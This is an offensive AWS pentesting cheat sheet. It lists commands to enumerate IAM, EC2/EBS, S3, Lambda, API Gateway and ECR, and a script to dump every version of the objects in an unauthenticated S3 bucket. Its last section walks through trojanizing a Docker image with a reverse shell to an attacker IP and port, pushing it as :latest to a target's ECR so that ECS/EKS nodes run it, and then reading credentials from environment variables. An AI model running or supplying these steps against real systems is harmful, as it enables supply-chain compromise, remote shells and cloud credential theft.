___
Map out accounts, services, regions, and resources that exist in the target AWS environment.
### Region Enumeration
---
**With Pacu**
```bash
>> run general__enum_regions
```
**AWS CLI**
```bash
aws ec2 describe-regions
```
### IAM Enumeration & Credential Reporting
---
Check password age, MFA enabled, access keys still active
```bash
aws iam generate-credential-report
aws iam get-credential-report
```
**List All Roles & Policies** (find which IAM roles/users you can assume or attach):
```bash
aws iam get-account-authorization-details \
  --output json \
  --query '{Roles:Roles, Users:UserDetailList}'

```
Check Attached Policies
```bash
aws iam list-user-policies --user-name <USERNAME>
aws iam list-attached-user-policies --user-name <USERNAME>
aws iam get-user-policy --user-name <USERNAME> --policy-name <POLICY_NAME>
```
### EC2 & EBS Enumeration
---
**List EC2 Instances**
```bash
aws ec2 describe-instances
```
**List EBS Volumes**
```bash
aws ec2 describe-volumes
```
**List EBS Snapshots (All & By Owner)**
```bash
# All snapshots in a region
aws ec2 describe-snapshots --region us-east-1

# Snapshots owned by a specific account
aws ec2 describe-snapshots --region us-east-1 --owner-ids <ACCOUNT_ID>

```
**Automate EC2 / EBS Enumeration with Pacu****
```bash
>> run ebs__enum_volumes_snapshots
```
### S3 Bucket Discovery & Interaction
---
**List All Buckets (If You Have Permissions)**
```bash
aws s3api list-buckets
```
**Automated Public Bucket Discovery** (no auth)
```bash
cloud_enum -k <keyword> -t 10 --disable-azure --disable-gcp
```
**FInd buckets with Google dorks**
```bash
site:.s3.amazonaws.com "<Target_Company>"
"Intitle:index.of.bucket" "<Target_Company>"
```
**List Objects in a Bucket**
```bash
aws s3 ls s3://<bucket-name>
```
**Sync Entire Bucket Locally**
```bash
aws s3 sync s3://<bucket-name> .
```
**If Blocked / Rate-Limited (Use s3api)**
```bash
aws s3api get-object --bucket "<bucket-name>" --key "<object-key>" "<local-output>"
```
**List Object Versions (When Versioning Is Enabled)**
```bash
aws s3api list-object-versions --bucket <bucket-name>
```
**Dump All Object Versions via Script**
```bash
# DumpObjectVersions.sh
read -p "Enter the S3 bucket name: " BUCKET_NAME
read -p "Enter the local dir path where data will be saved: " LOCAL
object_versions=$(aws s3api list-object-versions --bucket "$BUCKET_NAME" --no-sign-request | jq -c '.Versions[]')
while IFS= read -r object_version; do
    key=$(echo "$object_version" | jq -r '.Key')
    version_id=$(echo "$object_version" | jq -r '.VersionId')
    if [ -n "$key" ] && [ "$version_id" != "null" ]; then
        LOCAL_DIR="$LOCAL$key"
        mkdir -p "$(dirname "$LOCAL_DIR")"
        aws s3api get-object --bucket "$BUCKET_NAME" \
          --no-sign-request \
          --key "$key" \
          --version-id "$version_id" \
          "$LOCAL_DIR"
    fi
done <<< "$object_versions"
```
### Serverless & API Enumeration
---
**List All Lambda Functions**
```bash
aws lambda list-functions
```
**Get Detailed Info for a Lambda**
```bash
aws lambda get-function --function-name <function-name>
```
**Retrieve a Lambda’s Deployment Package (ZIP)**
copy the `"Location"` URL from `aws lambda get-function` output, download lambda:
```bash
curl "<Location_URL>" -o lambda.zip
```
**Discover API Gateway Endpoints**
```bash
aws apigateway get-rest-apis
```
From the returned ARN (`arn:aws:execute-api:<region>:<account>:<api-id>/*/*`), build the public invoke URL:
```bash
https://<api-id>.execute-api.<region>.amazonaws.com
```
###  Container Services Enumeration
---
**List ECR Repositories**
```bash
aws ecr describe-repositories
```
**List Images in a Specific Repository**
```bash
aws ecr describe-images --repository-name <repo-name>
```
#### Backdoor an Image with Dockerscan
install https://github.com/cr0hn/dockerscan
```bash
git clone https://github.com/cr0hn/dockerscan
cd dockerscan
sudo python3.6 setup.py install
```
Pull an existing image (Ubuntu as an example)
```bash
docker pull ubuntu:latest
docker save ubuntu:latest -o ubuntu_original
```
Trojanize it
```bash
dockerscan image modify trojanize ubuntu_original \
  -l <attacker_IP> -p <attacker_PORT> -o alpine_infected
```
Tag the infected image as :latest for ECR
```bash
docker tag alpine_infected:latest \
  <AWS_ACCOUNT_ID>.dkr.ecr.<region>.amazonaws.com/<REPO_NAME>:latest
```
Authenticate Docker to ECR
```bash
aws ecr get-login-password --region <region> | sudo docker login --username AWS --password-stdin <AWS_ACCOUNT_ID>.dkr.ecr.<region>.amazonaws.com
```
 Push the backdoored image
```bash
sudo docker push <AWS_ACCOUNT_ID>.dkr.ecr.<region>.amazonaws.com/<REPO_NAME>:latest
```
 Wait for any running ECS/EKS node to pull and run the new image
 **Once you have a shell in a compromised pod, look for creds in env vars**
 ```
 env
```
